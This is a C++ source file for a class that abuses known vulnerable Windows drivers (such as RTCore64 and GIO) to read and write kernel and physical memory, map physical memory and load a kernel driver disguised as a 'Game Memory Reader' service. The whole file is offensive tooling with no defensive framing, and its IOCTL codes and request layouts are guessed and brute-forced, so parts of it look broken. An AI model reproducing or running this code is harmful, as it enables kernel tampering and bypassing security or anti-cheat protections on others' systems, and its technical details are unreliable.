#include "VulnerableDriverExploit.h"
#include <psapi.h>
#include <winioctl.h>

#pragma comment(lib, "psapi.lib")

VulnerableDriverExploit::VulnerableDriverExploit()
    : m_DriverHandle(INVALID_HANDLE_VALUE)
    , m_AttachedProcessId(0)
{
    m_KnownDrivers = {
        { "Intel PPM Driver", "ppm", "\\\\.\\GIO", EXPLOIT_IOCTL | EXPLOIT_MAP_PHYSICAL, false },
        { "AWEAlloc Driver", "awealloc", "\\\\.\\AWEAlloc", EXPLOIT_IOCTL | EXPLOIT_MEMORY_MAPPING, false },
        { "MSI Afterburner", "RTCore64", "\\\\.\\RTCore64", EXPLOIT_IOCTL | EXPLOIT_DKOM, false },
        { "Gigabyte AORUS", "GLCKIO2", "\\\\.\\GLCKIO2", EXPLOIT_IOCTL, false },
        { "ASUS GPU Tweak", "ATKIO", "\\\\.\\ATKIO", EXPLOIT_IOCTL, false }
    };
}

VulnerableDriverExploit::~VulnerableDriverExploit()
{
    CloseDriver();
}

std::vector<VulnerableDriver> VulnerableDriverExploit::EnumerateVulnerableDrivers()
{
    std::vector<VulnerableDriver> available;
    
    for (auto& driver : m_KnownDrivers) {
        driver.IsAvailable = CheckDriverAvailable(driver.ServiceName);
        if (driver.IsAvailable) {
            available.push_back(driver);
        }
    }
    
    return available;
}

bool VulnerableDriverExploit::CheckDriverAvailable(const std::string& driverName)
{
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (scManager == NULL) {
        return false;
    }

    SC_HANDLE service = OpenServiceA(scManager, driverName.c_str(), SERVICE_QUERY_STATUS);
    bool available = (service != NULL);
    
    if (service) {
        CloseServiceHandle(service);
    }
    CloseServiceHandle(scManager);
    
    return available;
}

bool VulnerableDriverExploit::ExploitIntelPPM()
{
    VulnerableDriver driver = { "Intel PPM Driver", "ppm", "\\\\.\\GIO", EXPLOIT_IOCTL | EXPLOIT_MAP_PHYSICAL, false };
    
    if (!CheckDriverAvailable(driver.ServiceName)) {
        return false;
    }
    
    return ExploitGenericDriver(driver);
}

bool VulnerableDriverExploit::ExploitAWEAlloc()
{
    VulnerableDriver driver = { "AWEAlloc Driver", "awealloc", "\\\\.\\AWEAlloc", EXPLOIT_IOCTL | EXPLOIT_MEMORY_MAPPING, false };
    
    if (!CheckDriverAvailable(driver.ServiceName)) {
        return false;
    }
    
    return ExploitGenericDriver(driver);
}

bool VulnerableDriverExploit::ExploitMSIAfterburner()
{
    VulnerableDriver driver = { "MSI Afterburner", "RTCore64", "\\\\.\\RTCore64", EXPLOIT_IOCTL | EXPLOIT_DKOM, false };
    
    if (!CheckDriverAvailable(driver.ServiceName)) {
        return false;
    }
    
    return ExploitGenericDriver(driver);
}

bool VulnerableDriverExploit::ExploitGenericDriver(const VulnerableDriver& driver)
{
    if (!OpenDriver(driver.DevicePath)) {
        return false;
    }
    
    // Test basic functionality
    ULONG_PTR testAddress = 0x1000;
    ULONG_PTR testValue = 0;
    
    if (ReadMemoryViaExploit(testAddress, &testValue, sizeof(testValue))) {
        return true;
    }
    
    CloseDriver();
    return false;
}

bool VulnerableDriverExploit::ReadMemoryViaExploit(ULONG_PTR address, PVOID buffer, SIZE_T size)
{
    if (m_DriverHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Generic memory read structure
    struct {
        ULONG_PTR Address;
        ULONG Size;
    } request = { address, (ULONG)size };

    DWORD bytesReturned = 0;
    
    // Try common IOCTL codes for vulnerable drivers
    std::vector<DWORD> ioctls = {
        0x80002000, 0x80002004, 0x80002008, 0x8000200C,
        0x9C402040, 0x9C402044, 0x9C402048,
        0x22001C, 0x220020, 0x220024
    };

    for (DWORD ioctl : ioctls) {
        if (DeviceIoControl(m_DriverHandle, ioctl, &request, sizeof(request),
                           buffer, (DWORD)size, &bytesReturned, NULL)) {
            return bytesReturned == size;
        }
    }

    return false;
}

bool VulnerableDriverExploit::WriteMemoryViaExploit(ULONG_PTR address, const PVOID buffer, SIZE_T size)
{
    if (m_DriverHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    std::vector<BYTE> requestBuffer(sizeof(ULONG_PTR) * 2 + size);
    ULONG_PTR* request = (ULONG_PTR*)requestBuffer.data();
    request[0] = address;
    request[1] = size;
    memcpy(requestBuffer.data() + sizeof(ULONG_PTR) * 2, buffer, size);

    DWORD bytesReturned = 0;
    
    std::vector<DWORD> ioctls = {
        0x80002000, 0x80002004, 0x80002008, 0x8000200C,
        0x9C402040, 0x9C402044, 0x9C402048,
        0x22001C, 0x220020, 0x220024
    };

    for (DWORD ioctl : ioctls) {
        if (DeviceIoControl(m_DriverHandle, ioctl, requestBuffer.data(), (DWORD)requestBuffer.size(),
                           NULL, 0, &bytesReturned, NULL)) {
            return true;
        }
    }

    return false;
}

bool VulnerableDriverExploit::MapPhysicalMemory(ULONG_PTR physicalAddress, SIZE_T size, PVOID* virtualAddress)
{
    if (m_DriverHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    struct {
        ULONG_PTR PhysicalAddress;
        ULONG Size;
    } request = { physicalAddress, (ULONG)size };

    ULONG_PTR mappedAddress = 0;
    DWORD bytesReturned = 0;
    
    std::vector<DWORD> ioctls = {
        0x9C402040, 0x9C402044, 0x9C402048,
        0x80002000, 0x80002004
    };

    for (DWORD ioctl : ioctls) {
        if (DeviceIoControl(m_DriverHandle, ioctl, &request, sizeof(request),
                           &mappedAddress, sizeof(mappedAddress), &bytesReturned, NULL)) {
            if (mappedAddress != 0) {
                *virtualAddress = (PVOID)mappedAddress;
                return true;
            }
        }
    }

    return false;
}

bool VulnerableDriverExploit::AttachToProcess(DWORD processId)
{
    m_AttachedProcessId = processId;
    return true;
}

bool VulnerableDriverExploit::GetProcessBaseAddress(DWORD processId, ULONG_PTR* baseAddress)
{
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (processHandle == NULL) {
        return false;
    }

    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded)) {
        *baseAddress = (ULONG_PTR)hMods[0];
        CloseHandle(processHandle);
        return true;
    }

    CloseHandle(processHandle);
    return false;
}

bool VulnerableDriverExploit::LoadDriver(const std::string& driverPath)
{
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scManager == NULL) {
        return false;
    }

    SC_HANDLE service = CreateServiceA(
        scManager,
        "GameMemoryReader",
        "Game Memory Reader Driver",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (service == NULL) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS) {
            service = OpenServiceA(scManager, "GameMemoryReader", SERVICE_START);
        } else {
            CloseServiceHandle(scManager);
            return false;
        }
    }

    bool success = StartServiceA(service, 0, NULL) != FALSE;
    
    CloseServiceHandle(service);
    CloseServiceHandle(scManager);
    
    return success;
}

bool VulnerableDriverExploit::UnloadDriver()
{
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (scManager == NULL) {
        return false;
    }

    SC_HANDLE service = OpenServiceA(scManager, "GameMemoryReader", SERVICE_STOP | DELETE);
    if (service == NULL) {
        CloseServiceHandle(scManager);
        return false;
    }

    SERVICE_STATUS status;
    ControlService(service, SERVICE_CONTROL_STOP, &status);
    DeleteService(service);
    
    CloseServiceHandle(service);
    CloseServiceHandle(scManager);
    
    return true;
}

bool VulnerableDriverExploit::SendIoctl(DWORD ioctlCode, PVOID inputBuffer, DWORD inputSize,
                                        PVOID outputBuffer, DWORD outputSize, PDWORD bytesReturned)
{
    if (m_DriverHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    return DeviceIoControl(
        m_DriverHandle,
        ioctlCode,
        inputBuffer,
        inputSize,
        outputBuffer,
        outputSize,
        bytesReturned,
        NULL
    ) != FALSE;
}

bool VulnerableDriverExploit::OpenDriver(const std::string& devicePath)
{
    if (m_DriverHandle != INVALID_HANDLE_VALUE) {
        return true;
    }

    std::wstring widePath(devicePath.begin(), devicePath.end());
    m_DriverHandle = CreateFileW(
        widePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    return m_DriverHandle != INVALID_HANDLE_VALUE;
}

void VulnerableDriverExploit::CloseDriver()
{
    if (m_DriverHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(m_DriverHandle);
        m_DriverHandle = INVALID_HANDLE_VALUE;
    }
}

std::vector<VulnerableDriverExploit::DriverIOCTL> VulnerableDriverExploit::GetKnownIOCTLs()
{
    std::vector<DriverIOCTL> ioctls;
    
    DriverIOCTL intelPPM = { "Intel PPM", 0x80002000, 0x80002004, 0x80002008 };
    DriverIOCTL aweAlloc = { "AWEAlloc", 0x9C402040, 0x9C402044, 0x9C402048 };
    DriverIOCTL msiAfterburner = { "MSI Afterburner", 0x22001C, 0x220020, 0x220024 };
    
    ioctls.push_back(intelPPM);
    ioctls.push_back(aweAlloc);
    ioctls.push_back(msiAfterburner);
    
    return ioctls;
}
